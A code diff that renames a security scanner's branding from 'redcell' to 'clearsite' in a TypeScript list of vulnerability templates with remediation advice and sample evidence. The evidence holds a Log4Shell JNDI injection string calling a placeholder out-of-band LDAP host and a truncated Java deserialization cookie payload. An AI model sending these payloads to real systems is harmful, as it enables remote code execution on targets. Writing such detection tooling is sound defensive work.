@@ -17,7 +17,7 @@ export interface VulnTemplate {
   evidence: (host: string) => Evidence
 }
 
-const UA = 'User-Agent: redcell-scanner/2.6'
+const UA = 'User-Agent: clearsite-scanner/1.0'
 
 export const VULNS: readonly VulnTemplate[] = [
   {
@@ -415,7 +415,7 @@ export const VULNS: readonly VulnTemplate[] = [
       'Never deserialise untrusted data. Keep session state on the server, or sign and encrypt it and use a safe format such as JSON.',
     evidence: (h) => ({
       request: `GET /dashboard HTTP/1.1\nHost: ${h}\nCookie: state=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTa...`,
-      response: `HTTP/1.1 200 OK\nContent-Type: text/html\n\n# out-of-band DNS: a7f3.oob.redcell.example resolved from 10.20.4.17`,
+      response: `HTTP/1.1 200 OK\nContent-Type: text/html\n\n# out-of-band DNS: a7f3.oob.clearsite.example resolved from 10.20.4.17`,
     }),
   },
   {
@@ -774,7 +774,7 @@ export const VULNS: readonly VulnTemplate[] = [
     remediation:
       'Upgrade Log4j to 2.17.1 or later, remove the JndiLookup class from older jars, and block outbound LDAP from application hosts.',
     evidence: (h) => ({
-      request: `GET /api/search?q=auth HTTP/1.1\nHost: ${h}\nUser-Agent: \${jndi:ldap://a91c.oob.redcell.example/x}`,
+      request: `GET /api/search?q=auth HTTP/1.1\nHost: ${h}\nUser-Agent: \${jndi:ldap://a91c.oob.clearsite.example/x}`,
       response: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"results":[]}\n\n# out-of-band LDAP callback received from 10.30.1.8`,
     }),
   },
